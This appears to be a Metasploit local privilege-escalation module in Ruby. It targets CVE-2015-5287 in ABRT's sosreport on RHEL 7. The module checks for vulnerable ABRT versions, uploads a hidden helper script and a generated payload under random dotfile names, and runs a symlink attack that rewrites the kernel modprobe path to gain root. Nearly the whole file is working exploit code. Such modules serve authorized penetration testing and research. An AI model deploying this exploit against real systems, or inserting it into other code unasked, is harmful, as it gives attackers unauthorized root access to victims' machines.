# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ABRT sosreport Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on RHEL systems with
        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured
        as the crash handler.

        `sosreport` uses an insecure temporary directory, allowing local users
        to write to arbitrary files (CVE-2015-5287). This module uses a symlink
        attack on `/var/tmp/abrt/cc-*$pid/` to overwrite the `modprobe` path
        in `/proc/sys/kernel/modprobe`, resulting in root privileges.

        Waiting for `sosreport` could take a few minutes.

        This module has been tested successfully on:

        abrt 2.1.11-12.el7 on RHEL 7.0 x86_64; and
        abrt 2.1.11-19.el7 on RHEL 7.1 x86_64.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;rebel&#039;, # Discovery and sosreport-rhel7.py exploit
          &#039;bcoles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2015-11-23&#039;,
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;78137&#039;],
          [&#039;CVE&#039;, &#039;2015-5287&#039;],
          [&#039;EDB&#039;, &#039;38832&#039;],
          [&#039;URL&#039;, &#039;https://www.openwall.com/lists/oss-security/2015/12/01/1&#039;],
          [&#039;URL&#039;, &#039;https://access.redhat.com/errata/RHSA-2015:2505&#039;],
          [&#039;URL&#039;, &#039;https://access.redhat.com/security/cve/CVE-2015-5287&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=1266837&#039;]
        ]
    ))
    register_options [
      OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;Timeout for sosreport (seconds)&#039;, &#039;600&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;]
  end

  def timeout
    datastore[&#039;TIMEOUT&#039;]
  end

  def check
    kernel_core_pattern = cmd_exec &#039;grep abrt-hook-ccpp /proc/sys/kernel/core_pattern&#039;
    unless kernel_core_pattern.include? &#039;abrt-hook-ccpp&#039;
      vprint_error &#039;System is not configured to use ABRT for crash reporting&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;System is configured to use ABRT for crash reporting&#039;

    if cmd_exec(&#039;systemctl status abrt-ccpp | grep Active&#039;).include? &#039;inactive&#039;
      vprint_error &#039;abrt-ccp service not running&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;abrt-ccpp service is running&#039;

    # Patched in 2.1.11-35.el7
    pkg_info = cmd_exec(&#039;yum list installed abrt | grep abrt&#039;).to_s
    abrt_version = pkg_info[/^abrt.*$/].to_s.split(/\s+/)[1]
    if abrt_version.blank?
      vprint_status &#039;Could not retrieve ABRT package version&#039;
      return CheckCode::Safe
    end
    unless Gem::Version.new(abrt_version) < Gem::Version.new(&#039;2.1.11-35.el7&#039;)
      vprint_status "ABRT package version #{abrt_version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "ABRT package version #{abrt_version} is vulnerable"

    unless command_exists? &#039;python&#039;
      vprint_error &#039;python is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;python is installed&#039;

    CheckCode::Appears
  end

  def upload_and_chmodx(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    chmod path
    register_file_for_cleanup path
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    exe_data = ::File.binread ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2015-5287&#039;, &#039;sosreport-rhel7.py&#039;)
    exe_name = ".#{rand_text_alphanumeric 5..10}"
    exe_path = "#{base_dir}/#{exe_name}"
    upload_and_chmodx exe_path, exe_data

    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload_and_chmodx payload_path, generate_payload_exe

    register_file_for_cleanup &#039;/tmp/hax.sh&#039;

    print_status "Launching exploit - This might take a few minutes (Timeout: #{timeout}s) ..."
    output = cmd_exec "echo \"#{payload_path}& exit\" | #{exe_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
  end
end

